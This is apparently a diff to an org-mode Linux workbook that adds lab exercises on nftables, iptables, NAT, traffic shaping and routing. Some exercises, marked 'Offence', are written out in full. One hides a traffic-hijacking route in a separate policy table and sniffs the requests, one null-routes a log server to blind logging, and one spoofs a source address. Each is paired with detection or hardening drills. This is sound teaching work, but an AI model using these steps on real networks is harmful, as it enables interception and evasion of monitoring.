+    }
+}
+NFT
+for p in 22 8000 9000; do nc -zw1 10.10.0.2 $p 2>/dev/null && echo "$p open" || echo "$p blocked"; done
+ping -c 2 -q 10.10.0.2 | grep -o '[0-9]* received'
+ip netns exec server nft -a list chain inet filter input
+h=$(ip netns exec server nft -a list chain inet filter input | awk '/dport 22/ {print $NF}')
+ip netns exec server nft delete rule inet filter input handle "$h"
+nc -zw1 10.10.0.2 22 2>/dev/null && echo "22 open" || echo "22 blocked"
+#+end_src
+Two pings got through but the ping counter says 1: after the first echo
+request, connection tracking treats the rest as an established "connection"
+and the first rule accepts them. Rule order matters.
+
+** TODO E13.4 — Log and rate-limit
+Keep the default-deny firewall, but log every packet it drops with a prefix you
+can search for, then list which ports were knocked on. Also limit pings to five
+a second, and flood the server with fifty to see the limit work.
+You'll meet: =log prefix=, =dmesg=, =net.netfilter.nf_log_all_netns=,
+=limit rate over N/second=, =burst=, =ping -i=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+A =log= rule writes to the kernel log, which =dmesg= reads; put it last so it
+only sees packets nothing accepted. The kernel ignores logging from other
+namespaces unless =sysctl net.netfilter.nf_log_all_netns=1=. =limit rate over
+5/second drop= drops whatever exceeds the rate; it must come /before/ the
+=established= rule, or E13.3's surprise lets the flood straight through.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+sysctl -qw net.netfilter.nf_log_all_netns=1
+ip netns exec server nft flush ruleset
+ip netns exec server nft -f - <<'NFT'
+table inet filter {
+    chain input {
+        type filter hook input priority 0; policy drop;
+        icmp type echo-request limit rate over 5/second burst 5 packets counter drop
+        ct state established,related accept
+        icmp type echo-request accept
+        tcp dport 22 accept
+        log prefix "lab-drop: " counter
+    }
+}
+NFT
+nc -zw1 10.10.0.2 8000; nc -zw1 10.10.0.2 9000
+dmesg | grep lab-drop | grep -oE 'DPT=[0-9]+' | sort | uniq -c
+ping -c 50 -i 0.01 -q 10.10.0.2 | grep -o '[0-9]*% packet loss'
+ip netns exec server nft list ruleset | grep -E 'counter packets [1-9]'
+#+end_src
+
+** TODO E13.5 — Rulesets as files
+Write the server's whole firewall as a file: default deny, with the allowed TCP
+ports kept in a named /set/ (22 and 8000). Check its syntax, load it, then open
+9000 by adding to the set without touching any rule. Finally save the live
+ruleset, wipe it, and restore it.
+You'll meet: =nft -f FILE=, =nft -c= (check only), =flush ruleset= inside a
+file, named sets, =@set=, =nft add element=, =nft list ruleset > FILE=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+A ruleset file uses the same syntax =nft list ruleset= prints. Starting it with
+=flush ruleset= makes loading it replace everything /atomically/: the old rules
+stay in force until the new ones are complete, so a typo never leaves the
+machine half-protected. A set (=type inet_service= for ports) is matched with
+=tcp dport @NAME=, and changing its elements changes the rule's effect
+instantly. Servers load such a file at boot, often =/etc/nftables.conf=.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+cat > /root/workbook-data/net/firewall.nft <<'NFT'
+flush ruleset
+table inet filter {
+    set allowed_tcp {
+        type inet_service
+        elements = { 22, 8000 }
+    }
+    chain input {
+        type filter hook input priority 0; policy drop;
+        ct state established,related accept
+        iif lo accept
+        ip protocol icmp accept
+        tcp dport @allowed_tcp accept
+    }
+}
+NFT
+ip netns exec server nft -c -f /root/workbook-data/net/firewall.nft && echo "syntax ok"
+ip netns exec server nft -f /root/workbook-data/net/firewall.nft
+for p in 22 8000 9000; do nc -zw1 10.10.0.2 $p 2>/dev/null && echo "$p open" || echo "$p blocked"; done
+ip netns exec server nft add element inet filter allowed_tcp '{ 9000 }'
+nc -zw1 10.10.0.2 9000 2>/dev/null && echo "9000 open"
+ip netns exec server nft list ruleset > /tmp/saved.nft
+ip netns exec server nft flush ruleset
+nc -zw1 10.10.0.2 9000 2>/dev/null && echo "after flush: 9000 open"
+ip netns exec server nft -f /tmp/saved.nft
+ip netns exec server nft list set inet filter allowed_tcp | grep elements
+#+end_src
+
+** TODO E13.6 — iptables, the classic syntax
+Most guides, scripts and older servers use =iptables=. Build E13.3's firewall
+with it: accept established traffic, loopback, ping and SSH, reject 9000, and
+drop the rest by policy. List the rules with packet counts and line numbers,
+delete one by number, and dump the rules in save format. Then look underneath:
+what is =iptables= actually talking to here?
+You'll meet: =-A= / =-D= / =-P= / =-F=, =-p tcp --dport=, =-j ACCEPT= /
+=REJECT=, =-m conntrack --ctstate=, =-L -n -v --line-numbers=,
+=iptables-save=, =iptables-translate=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+=iptables= has fixed tables and chains (=filter= table, =INPUT= chain); =-A
+INPUT= appends a rule, =-P INPUT DROP= sets the policy, =-D INPUT 5= deletes
+rule 5. =-n= skips slow name lookups and =-v= adds counters. =iptables -V=
+names its backend: on modern systems it's =nf_tables=, so your rules live in
+nftables too and =nft list ruleset= shows them. =iptables-translate= converts a
+command to =nft= syntax.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+ip netns exec server nft flush ruleset
+ip netns exec server iptables -V
+ip netns exec server iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+ip netns exec server iptables -A INPUT -i lo -j ACCEPT
+ip netns exec server iptables -A INPUT -p icmp -j ACCEPT
+ip netns exec server iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+ip netns exec server iptables -A INPUT -p tcp --dport 9000 -j REJECT --reject-with tcp-reset
+ip netns exec server iptables -P INPUT DROP
+ip netns exec server iptables -L INPUT -n -v --line-numbers
+for p in 22 8000 9000; do nc -zw1 10.10.0.2 $p 2>/dev/null && echo "$p open" || echo "$p blocked"; done
+ip netns exec server iptables -D INPUT 5
+ip netns exec server iptables-save | grep -v '^#'
+ip netns exec server nft list chain ip filter INPUT | head -4
+iptables-translate -A INPUT -p tcp --dport 8000 -j ACCEPT
+ip netns exec server iptables -P INPUT ACCEPT
+ip netns exec server iptables -F
+#+end_src
+=iptables-save= output is also the file format =iptables-restore= loads at
+boot. Mixing hand-written =nft= rules and =iptables= rules on one machine
+works, but makes the firewall hard to reason about: pick one.
+
+** TODO E13.7 — NAT: redirect a port
+Nothing in the server listens on port 80. Make =curl http://10.10.0.2/= reach
+the web server on 8000 anyway, with a NAT rule rather than by reconfiguring the
+web server. Then do the same with =iptables= for port 8080.
+You'll meet: =nat= chains, =type nat hook prerouting=, =redirect to :PORT=,
+=iptables -t nat -A PREROUTING -j REDIRECT --to-ports=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+NAT rewrites addresses or ports as packets arrive (=prerouting=) or leave
+(=postrouting=). =redirect= sends a packet to a port on this same machine.
+Connection tracking remembers the rewrite and undoes it on the replies, so the
+client never knows. The same machinery, with =dnat= and =masquerade=, is how
+home routers and Docker publish ports.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+ip netns exec server nft flush ruleset
+curl -s -m 2 http://10.10.0.2/ || echo "port 80: nothing listening"
+ip netns exec server nft add table ip nat
+ip netns exec server nft add chain ip nat prerouting '{ type nat hook prerouting priority dstnat; }'
+ip netns exec server nft add rule ip nat prerouting tcp dport 80 redirect to :8000
+curl -s -m 2 http://10.10.0.2/
+ip netns exec server ss -tln | grep -c ':80 '
+ip netns exec server nft flush ruleset
+ip netns exec server iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-ports 8000
+curl -s -m 2 http://10.10.0.2:8080/
+ip netns exec server iptables -t nat -F
+#+end_src
+=ss= still shows nothing listening on 80: the web server never knew.
+
+** TODO E13.8 — netem: a bad network on demand
+Make the link to the server behave like a poor connection. Add 200 ms of
+delay and compare ping times before and after. Then make the delay vary (100
+ms ± 50 ms), and then lose 25% of packets instead. How does the delay change
+how long a web request takes, and why by more than 200 ms?
+You'll meet: =tc qdisc show= / =add= / =replace= / =del=, =root=, =netem
+delay= (with jitter), =netem loss=, =tc -s=, =curl -w %{time_connect}=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Each network interface has a /queueing discipline/ (qdisc) deciding how its
+outgoing packets are sent. =tc qdisc add dev lab0 root netem delay 200ms=
+holds every packet leaving =lab0= for 200 ms; =replace= swaps the settings in
+place; =del dev lab0 root= restores the default. Only packets /leaving/ =lab0=
+are affected, so the delay is one-way. A web request needs a TCP handshake
+before the request itself, so it pays the delay more than once.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+ip netns exec server nft flush ruleset
+tc qdisc del dev lab0 root 2>/dev/null
+tc qdisc show dev lab0
+ping -c 3 -q 10.10.0.2 | tail -1
+tc qdisc add dev lab0 root netem delay 200ms
+tc qdisc show dev lab0
+ping -c 3 -q 10.10.0.2 | tail -1
+curl -s -o /dev/null -w 'connect %{time_connect}s, total %{time_total}s\n' http://10.10.0.2:8000/
+tc qdisc replace dev lab0 root netem delay 100ms 50ms
+ping -c 5 -q 10.10.0.2 | tail -1
+tc qdisc replace dev lab0 root netem loss 25%
+ping -c 40 -i 0.05 -q 10.10.0.2 | grep -o '[0-9]*% packet loss'
+tc -s qdisc show dev lab0 | grep -o 'dropped [0-9]*'
+tc qdisc del dev lab0 root
+#+end_src
+This is how to test a program against a slow or flaky network without leaving
+your desk. Try =ssh root@10.10.0.2= or a =git push= over SSH (track 12) with
+loss turned on.
+
+** TODO E13.9 — Bandwidth limits
+Download =blob.bin= (2 MB) from the server at full speed. Then cap the
+server's outgoing traffic at 8 Mbit/s and download it again: how long should it
+take, and does it? Finally, split the link into two classes: web traffic gets
+16 Mbit/s, everything else 2 Mbit/s. Check which class the download used.
+You'll meet: =tc -n NS=, =tbf rate burst latency=, =htb= classes,
+=classid=, =default=, =tc filter ... u32 match=, =tc -s class show=,
+=curl -w %{speed_download}=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Downloads flow from the server to you, so shape the server's end, =srv0=, with
+=tc -n server=. A /token bucket filter/ (=tbf=) lets data out at =rate=, with
+=burst= allowed in one go. =htb= builds a tree: a root qdisc with classes,
+each with its own =rate=; =default 20= sends unclassified traffic to class
+=1:20=, and a =filter= picks traffic for the others. 8 Mbit/s is 1 MB/s.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mknet.sh
+ip netns exec server nft flush ruleset
+tc -n server qdisc del dev srv0 root 2>/dev/null
+curl -s -o /dev/null -w 'unlimited: %{size_download} bytes in %{time_total}s\n' http://10.10.0.2:8000/blob.bin
+tc -n server qdisc add dev srv0 root tbf rate 8mbit burst 32kb latency 50ms
+curl -s -o /dev/null -w 'tbf 8mbit: %{speed_download} bytes/s, %{time_total}s\n' http://10.10.0.2:8000/blob.bin
+tc -n server qdisc replace dev srv0 root handle 1: htb default 20
+tc -n server class add dev srv0 parent 1: classid 1:10 htb rate 16mbit
+tc -n server class add dev srv0 parent 1: classid 1:20 htb rate 2mbit
+tc -n server filter add dev srv0 parent 1: protocol ip u32 match ip sport 8000 0xffff flowid 1:10
+curl -s -o /dev/null -w 'htb class 1:10: %{speed_download} bytes/s\n' http://10.10.0.2:8000/blob.bin
+tc -n server -s class show dev srv0 | grep -A1 'class htb' | grep -oE 'class htb 1:[0-9]+|Sent [0-9]+ bytes'
+tc -n server qdisc del dev srv0 root
+#+end_src
+The filter matches packets /from/ port 8000, the web server's replies. Without
+it, every download would fall into the 2 Mbit/s default class.
+
+** TODO E13.10 — Reading a routing table
+Build the bigger network (=mkroute.sh=, the first line of every solution) and read
+the routing tables: your lab's, the client's in both =ip= and classic =route=
+form, and the router's. Ask the client's kernel which way it would send a
+packet to the web server and to mallory, then trace the hops.
+You'll meet: =ip route=, =route -n= (its columns and flags), =default via=,
+connected routes, =ip route get=, =tracepath=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+A routing table maps destination networks to a next hop. A /connected/ route
+(=proto kernel scope link=) means "on this cable, deliver directly"; =via X=
+means "hand it to router X"; =default= (=0.0.0.0/0=) catches everything else.
+The kernel picks the /most specific/ matching route. =route -n= is the old
+net-tools view of the same table: flag =U= is up, =G= uses a gateway, =H= is a
+single host. =ip route get ADDR= shows the decision for one address.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mkroute.sh
+ip route
+ip -n client route
+ip netns exec client route -n
+ip -n router route
+ip -n client route get 10.2.0.2
+ip -n client route get 10.1.0.66
+ip netns exec client tracepath -n 10.2.0.2 | awk '$1 ~ /^[0-9]+:$/ {print $1, $2}' | uniq
+#+end_src
+The client reaches mallory directly (same LAN, no =via=) but the web server
+only through the router, one hop further.
+
+** TODO E13.11 — Build the path by hand
+Break the network: remove the client's and the web server's default routes and
+stop the router forwarding. Then put it back one piece at a time, trying a web
+request after each step and explaining each failure.
+You'll meet: =ip route add= / =del=, =net.ipv4.ip_forward=, the return path,
+"Network is unreachable" vs a timeout.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Three things must all be true: the client has a route to the server's network,
+the router is willing to forward (=sysctl net.ipv4.ip_forward=1=; Linux won't
+by default), and the server has a route /back/. A missing local route fails
+instantly; anything wrong further along shows up as a timeout, because the
+packets just vanish somewhere.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mkroute.sh
+try() { echo "-- $1"; ip netns exec client curl -sS -m 2 -o /dev/null -w 'HTTP %{http_code}\n' http://10.2.0.2:8000/ 2>&1 | sed 's/^curl: ([0-9]*) //' | grep -v 'HTTP 000'; }
+ip -n client route del default
+ip -n web route del default
+ip netns exec router sysctl -qw net.ipv4.ip_forward=0
+ip -n client route get 10.2.0.2 2>&1
+try "client has no route"
+ip -n client route add 10.2.0.0/24 via 10.1.0.1
+try "client knows the way, router won't forward"
+ip netns exec router sysctl -qw net.ipv4.ip_forward=1
+try "router forwards, web can't reply"
+ip -n web route add 10.1.0.0/24 via 10.2.0.1
+try "routes both ways"
+ip -n client route
+ip -n client route del 10.2.0.0/24
+ip -n client route add default via 10.1.0.1
+ip -n web route del 10.1.0.0/24
+ip -n web route add default via 10.2.0.1
+#+end_src
+The last two failures look identical from the client. That's why =tcpdump= at
+each hop (track 12) is the routing debugger: find where the packets stop.
+
+** TODO E13.12 — Offence: hijack traffic with one route
+Assume an attacker has root on the client. Make the client's traffic to the web
+server pass through mallory, who forwards it on so the victim notices nothing,
+and capture the victim's HTTP request on mallory. Do it first with a
+more-specific route, then hide it: keep the main table clean and put the
+hijack in a separate routing table chosen by a /policy rule/.
+You'll meet: longest-prefix match, =/32= host routes, =ip rule=, routing
+tables (=table 66=), =ip route get=, forwarding on the attacker,
+=send_redirects=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+A =/32= route for one address beats the =/24= and the default, whatever its
+order. Mallory must forward (=ip_forward=1=) or the victim's connection breaks
+and gives the game away. Mallory sends packets back out of the interface they
+came in on, which makes its kernel helpfully tell the client to use the router
+directly (an ICMP redirect); attackers turn that off with =send_redirects=0=.
+=ip route= shows only the =main= table; =ip rule= decides which tables are
+consulted, and in what order.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mkroute.sh
+ip netns exec mallory sysctl -qw net.ipv4.ip_forward=1 net.ipv4.conf.all.send_redirects=0 net.ipv4.conf.eth0.send_redirects=0
+sniff() {
+  ip netns exec mallory timeout 3 tcpdump -i eth0 -n -l -A 'tcp dst port 8000' 2>/dev/null | grep -m1 -o 'GET [^ ]* HTTP/1.1' &
+  sleep 0.5
+  ip netns exec client curl -s -m 2 -o /dev/null -w "victim got HTTP %{http_code}\n" http://10.2.0.2:8000/
+  wait
+}
+echo "== before"; sniff
+ip -n client route add 10.2.0.2/32 via 10.1.0.66
+echo "== a /32 route via mallory"; ip -n client route get 10.2.0.2 | head -1; sniff
+ip -n client route del 10.2.0.2/32
+ip -n client rule add to 10.2.0.2 lookup 66 pref 100
+ip -n client route add default via 10.1.0.66 table 66
+echo "== hidden in table 66"; ip -n client route; ip -n client route get 10.2.0.2 | head -1; sniff
+ip -n client rule del pref 100
+ip -n client route flush table 66
+#+end_src
+Mallory sees only half the conversation: the web server's replies go straight
+back through the router. An attacker who wanted both directions would also need
+to be on the server's side, or to poison ARP so the router sends to them.
+
+** TODO E13.13 — Route types: weapon and shield
+Routes can do more than forward. On the client, point =blackhole=,
+=unreachable= and =prohibit= routes at the web server in turn and compare the
+errors. Then play attacker on the router: send a log message from the client to
+the log server at =10.2.0.3=, null-route the log server, and send another. What
+does the client see? Finally play defender: null-route mallory on the router.
+You'll meet: =blackhole=, =unreachable=, =prohibit=, =ip route replace=,
+=logger -n -P -d= (remote syslog over UDP), null routes.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+A local program gets an error straight away from all three types: =EINVAL=,
+=EHOSTUNREACH= or =EACCES=. On a router the difference matters: =unreachable=
+and =prohibit= send an ICMP error back, =blackhole= drops silently. Syslog over
+UDP expects no reply, so a silently dropped message leaves the sender none the
+wiser. Null routes are also a cheap defence: a single =blackhole= route stops
+all traffic to an abusive address without touching the firewall.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mkroute.sh
+for type in blackhole unreachable prohibit; do
+  ip -n client route replace "$type" 10.2.0.2/32
+  printf '%-12s ' "$type:"; ip netns exec client nc -zvw1 10.2.0.2 8000 2>&1 | grep -o 'failed: .*'
+done
+ip -n client route del 10.2.0.2/32
+log=/root/workbook-data/net/syslog.txt
+: > "$log"
+send() {
+  ip netns exec client logger -n 10.2.0.3 -P 514 -d "$1"; echo "logger exit $?"
+  sleep 0.3; grep -q "$1" "$log" && echo "  log server got: $1" || echo "  log server never got: $1"
+}
+send "sudo: alice opened a root shell"
+ip -n router route add blackhole 10.2.0.3/32
+send "attacker deleted /var/log"
+ip -n router route del blackhole 10.2.0.3/32
+ip -n router route add blackhole 10.1.0.66/32
+printf 'mallory -> web: '; ip netns exec mallory ping -c2 -W1 10.2.0.2 | grep -o '[0-9]*% packet loss'
+printf 'client  -> web: '; ip netns exec client ping -c2 -W1 10.2.0.2 | grep -o '[0-9]*% packet loss'
+ip -n router route del blackhole 10.1.0.66/32
+#+end_src
+=logger= reported success both times. Blinding remote logging is an early step
+in many intrusions, which is why a log server that suddenly goes quiet should
+raise an alarm, and why logs worth trusting travel over TCP with
+acknowledgements.
+
+** TODO E13.14 — Defence: catch a route change
+Take a baseline of the client's routing state, start watching for changes,
+then replay E13.12's hidden hijack. Show that =ip route= still looks clean,
+and that the baseline diff, the live monitor and =ip route get= all catch it.
+You'll meet: =ip route show table all=, =ip rule=, =diff= against a
+baseline, =ip monitor route rule=, process substitution.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Checking only =ip route= misses anything in other tables. Snapshot every table
+plus the rules, minus the =local= and =broadcast= entries the kernel manages
+itself. =ip monitor= prints routing changes as they happen; run it in the
+background into a file. On a real server, E16.4's =execve= audit rule would
+also record /who/ ran the =ip= commands.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mkroute.sh
+snap() { ip -n client -4 route show table all | grep -v '^\(local\|broadcast\) '; ip -n client -4 rule; }
+snap > /tmp/routes.baseline
+ip -n client monitor route rule > /tmp/route-events.txt 2>/dev/null & mon=$!
+sleep 0.3
+ip -n client rule add to 10.2.0.2 lookup 66 pref 100
+ip -n client route add default via 10.1.0.66 table 66
+sleep 0.3; kill "$mon"
+echo "== ip route (main table only) looks clean:"; ip -n client route
+echo "== diff against the baseline:"; diff /tmp/routes.baseline <(snap)
+echo "== what ip monitor saw:"; cat /tmp/route-events.txt
+echo "== the truth for one destination:"; ip -n client route get 10.2.0.2 | head -1
+ip -n client rule del pref 100
+ip -n client route flush table 66
+#+end_src
+
+** TODO E13.15 — Defence: harden the kernel's routing
+List the routing-related kernel settings on the router. Then let mallory spoof
+a source address that belongs to the web server's network and ping the web
+server: count how many spoofed packets arrive with reverse-path filtering off,
+then on, and find the kernel's log entry. Finally lock down the client, which
+is not a router and shouldn't behave like one.
+You'll meet: =rp_filter= (reverse-path filtering), =log_martians=,
+=accept_redirects=, =send_redirects=, =accept_source_route=, =ip_forward=,
+=ping -I=, =/etc/sysctl.d=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Strict reverse-path filtering (=rp_filter=1=) drops a packet if the route
+/back/ to its source address doesn't leave through the interface it arrived
+on. A packet claiming to come from the web side but arriving from the LAN is a
+/martian/; =log_martians=1= writes it to the kernel log. Hosts that aren't
+routers should also ignore ICMP redirects (E13.12's hint) and source-routed
+packets. Make settings permanent in a file under =/etc/sysctl.d/=.
+*** Solution
+#+begin_src bash :results output
+bash /root/workbook-data/net/mkroute.sh
+ip netns exec router sysctl net.ipv4.ip_forward net.ipv4.conf.all.rp_filter net.ipv4.conf.all.accept_redirects net.ipv4.conf.all.send_redirects net.ipv4.conf.all.accept_source_route net.ipv4.conf.all.log_martians
+ip -n mallory addr add 10.2.0.99/32 dev eth0 2>/dev/null
+spoof() {
+  ip netns exec web timeout 2 tcpdump -i eth0 -n -l 'icmp and src host 10.2.0.99' 2>/dev/null > /tmp/spoof.txt &
+  sleep 0.5
+  ip netns exec mallory ping -c 3 -i 0.2 -W 1 -I 10.2.0.99 10.2.0.2 > /dev/null 2>&1
+  wait
+  echo "rp_filter=$1: web received $(grep -c 'echo request' /tmp/spoof.txt) spoofed packets"
+}
+ip netns exec router sysctl -qw net.ipv4.conf.all.rp_filter=0 net.ipv4.conf.br0.rp_filter=0
+spoof 0
+ip netns exec router sysctl -qw net.ipv4.conf.all.rp_filter=1 net.ipv4.conf.all.log_martians=1
+spoof 1
+dmesg | grep -i martian | tail -1
+ip -n mallory addr del 10.2.0.99/32 dev eth0
+ip netns exec client sysctl -qw net.ipv4.conf.all.accept_redirects=0 net.ipv4.conf.all.accept_source_route=0 net.ipv4.ip_forward=0
+ip netns exec client sysctl net.ipv4.conf.all.accept_redirects net.ipv4.ip_forward
+#+end_src
+Spoofed source addresses power reflection attacks and fool IP-based trust.
+Reverse-path filtering at every router stops them at the edge.
+
+* 14. The modern command line
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -2614,7 +3722,7 @@ managers in =yazi= and =lazygit=. They're all installed, and the lab's
 =~/.bashrc= already turns on the =fzf= and =zoxide= shell integration. None of
 them replace knowing =grep= and =find=: they're what you reach for once you do.
 
-** TODO E13.1 — fzf: fuzzy-find anything
+** TODO E14.1 — fzf: fuzzy-find anything
 Open a file from the corpus in Neovim by picking it from a fuzzy list. Search
 your shell history fuzzily, insert a file path into a command without typing
 it, and =cd= into a directory by picking it. Add a live preview.
@@ -2636,7 +3744,7 @@ $ fd -e csv . /root | fzf --multi --preview 'bat --color=always {}'
 #+end_example
 Anything that produces lines can feed fzf: =git branch | fzf=, =ps aux | fzf=.
 
-** TODO E13.2 — ripgrep
+** TODO E14.2 — ripgrep
 Search the corpus for "Holmes" with line numbers; case-insensitive whole-word
 "watson"; only in Python files; list only file names; show two lines of
 context; and search for a literal =.*= without it being a regex.
@@ -2662,7 +3770,7 @@ rg -F '.*' /root/workbook-data -l | head -3
 rg --files /root/workbook-data/toolbox/tree | head -4
 #+end_src
 
-** TODO E13.3 — fd and bat
+** TODO E14.3 — fd and bat
 With =fd=: every =.c= file under =/root/workbook-data=; directories named
 =src=; hidden files too; files changed in the last day; and run a command on
 each result. With =bat=: page through a file with syntax highlighting and line
@@ -2689,7 +3797,7 @@ fd -e csv . toolbox -x wc -l
 bat -p --color=never -r 1:3 toolbox/app.conf
 #+end_src
 
-** TODO E13.4 — eza and zoxide
+** TODO E14.4 — eza and zoxide
 List the playground as a tree with git status and icons, sorted by size. Then
 visit a few deep directories and jump back to them with two letters.
 You'll meet: =eza -l=, =--tree=, =--git=, =--icons=, =-s size=, =z=, =zi=.
@@ -2714,7 +3822,7 @@ $ z perms           # jumps to /srv/lab/perms
 $ zi                # pick from everywhere you've been
 #+end_example
 
-** TODO E13.5 — yazi: a file manager in the terminal
+** TODO E14.5 — yazi: a file manager in the terminal
 Open yazi in the playground. Move around, preview files, select several, copy
 them to =/tmp=, rename one, jump to a directory by name, and open a file in
 Neovim. Then use it from inside Neovim.
@@ -2740,7 +3848,7 @@ $ yazi /root/workbook-data/shell/playground
 Interactive by design; the payoff is managing files with the same keys as your
 editor.
 
-** TODO E13.6 — lazygit
+** TODO E14.6 — lazygit
 Open lazygit in a copy of the practice repository. Stage part of a file (one
 hunk, not all of it), commit, create a branch, switch between branches, and
 look at a commit's diff. Then undo a commit.
@@ -2766,7 +3874,7 @@ $ lazygit
 lazygit runs ordinary git commands underneath; its command log (=@=) shows
 exactly which ones, which makes it a good way to learn git too.
 
-* 14. Observability & performance
+* 15. Observability & performance
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -2776,7 +3884,7 @@ did the memory and the disk go? Is the machine busy with CPU or waiting on the
 disk? And which of two ways is actually faster? The tools here answer those
 questions in seconds. =procs/hog.sh= from track 4 is handy for making load.
 
-** TODO E14.1 — time: real, user and sys
+** TODO E15.1 — time: real, user and sys
 Time =sleep 1=, a CPU-bound loop, and =find /nix/store -name '*.so' | wc -l=.
 Explain the three numbers for each. Then get the peak memory of a command.
 You'll meet: the =time= keyword, GNU =/usr/bin/time -v= (here
@@ -2800,7 +3908,7 @@ command time -v python3 -c 'x = bytearray(100_000_000)' 2>&1 | grep -E 'Maximum 
 Bash writes =time='s report to stderr; =2>&1= on the group brings it into the
 output here.
 
-** TODO E14.2 — Memory
+** TODO E15.2 — Memory
 How much memory does the lab have, how much is in use, and how much is really
 available? Which processes use the most? Watch a program's memory grow.
 You'll meet: =free -h=, =/proc/meminfo=, "available" vs "free", buffers and
@@ -2823,7 +3931,7 @@ python3 -c 'import time; x = bytearray(200_000_000); time.sleep(3)' & p=$!; slee
 ps -o pid,rss,vsz,cmd -p $p; wait $p
 #+end_src
 
-** TODO E14.3 — Disk space
+** TODO E15.3 — Disk space
 Which filesystems are how full? What are the ten biggest directories under
 =/root=, and the biggest single files in the lab? Explore =/nix/store=
 interactively.
@@ -2847,7 +3955,7 @@ find / -xdev -type f -size +20M -exec ls -lh {} + 2>/dev/null | awk '{print $5, 
 #+end_src
 Then try =ncdu /nix/store=: every tool in this lab, one directory each.
 
-** TODO E14.4 — Load and CPU
+** TODO E15.4 — Load and CPU
 Run two copies of =hog.sh= and watch the system from the outside: load
 average, per-CPU usage, run queue, context switches. What does a load of 2.0
 mean on this machine?
@@ -2873,7 +3981,7 @@ kill $a $b
 Two hogs on four CPUs: =r= around 2, =us= around 50%, =id= around 50%. With
 more hogs than CPUs, =r= climbs past =nproc= and everything waits.
 
-** TODO E14.5 — Disk I/O
+** TODO E15.5 — Disk I/O
 Write 500 MB straight to disk, bypassing the cache, while =iostat= watches.
 Then read it back twice and explain why the second read is so much faster.
 You'll meet: =dd bs= =count= =oflag=direct=, =iostat -x 1=, =%util=,
@@ -2897,7 +4005,7 @@ dd if=/tmp/io.bin of=/dev/null bs=1M 2>&1 | tail -1
 rm /tmp/io.bin
 #+end_src
 
-** TODO E14.6 — hyperfine: which is faster?
+** TODO E15.6 — hyperfine: which is faster?
 Count the lines containing "Holmes" in the corpus with =grep=, =rg=, =awk= and
 Python. Benchmark them properly, with warm-up runs, and export the results as a
 Markdown table.
@@ -2925,7 +4033,7 @@ Python pays tens of milliseconds just to start; for one small file that
 dominates everything else. Measure with realistic inputs before choosing a
 tool for speed.
 
-** TODO E14.7 — perf: counting what the CPU does
+** TODO E15.7 — perf: counting what the CPU does
 Count cycles, instructions and cache misses for a C program and compare two
 versions of a loop. Then see which functions a program spends its time in.
 You'll meet: =perf stat=, =perf record= / =perf report=, instructions per
@@ -2962,7 +4070,7 @@ perf stat -e task-clock,cache-misses ./sum columns 2>&1 | grep -E 'task-clock|ca
 Walking the matrix by columns jumps across memory and misses the cache on
 almost every access; by rows it streams. Same work, very different speed.
 
-* 15. Auditing with auditd
+* 16. Auditing with auditd
 :PROPERTIES:
 :VISIBILITY: children
 :END:
@@ -2977,7 +4085,7 @@ events to =/var/log/audit/audit.log=, and =ausearch= and =aureport= read them.
 Each lab is its own VM with its own kernel, so experimenting here can't affect
 anything else. The lab's audit config is in =/etc/audit/auditd.conf=.
 
-** TODO E15.1 — Is auditing on?
+** TODO E16.1 — Is auditing on?
 Check whether the kernel's audit system is enabled and whether a daemon is
 collecting events. Start =auditd=, enable auditing, and confirm events are
 being written.
@@ -3000,7 +4108,7 @@ auditctl -s | grep -E '^(enabled|pid|backlog)'
 tail -2 /var/log/audit/audit.log | cut -c1-110
 #+end_src
 
-** TODO E15.2 — Watch a file
+** TODO E16.2 — Watch a file
 Put a watch on =/etc/passwd= for writes and attribute changes, tagged with a
 key. Add a user =carol= (and remove her again). Then find exactly which
 programs touched the file, when, and as whom.
@@ -3024,7 +4132,7 @@ sleep 1
 ausearch -k passwd-changes -i --start recent 2>/dev/null | grep -oE 'type=SYSCALL.*' | grep -oE 'comm=[^ ]+|exe=[^ ]+|uid=[^ ]+' | sort | uniq -c
 #+end_src
 
-** TODO E15.3 — Who read the secret?
+** TODO E16.3 — Who read the secret?
 Watch the private secret in =/srv/lab/perms= for reads. Read it as root; then
 let alice "log in" and read it through =sudo=; then let bob try. Find the
 reads, and show that the log names alice even though =sudo= made her root: the
@@ -3053,9 +4161,9 @@ ausearch -k secret-read -i --start recent 2>/dev/null | grep -oE 'type=SYSCALL.*
 #+end_src
 The second read shows =auid=alice uid=root=: root did it, on alice's behalf.
 Bob's attempt is absent because he was stopped at the =private= directory and
-never reached the file; E15.5 catches failures like his.
+never reached the file; E16.5 catches failures like his.
 
-** TODO E15.4 — Audit every command run
+** TODO E16.4 — Audit every command run
